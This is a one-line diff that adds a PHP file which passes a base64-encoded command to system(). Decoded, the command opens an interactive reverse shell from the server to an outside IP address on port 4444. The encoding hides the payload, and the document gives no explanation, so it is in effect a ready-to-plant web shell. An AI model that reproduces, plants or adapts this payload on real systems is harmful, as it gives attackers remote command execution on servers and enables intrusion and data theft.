@@ -1,0 +1,1 @@
+<?php system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx|base64 -d|bash")?>
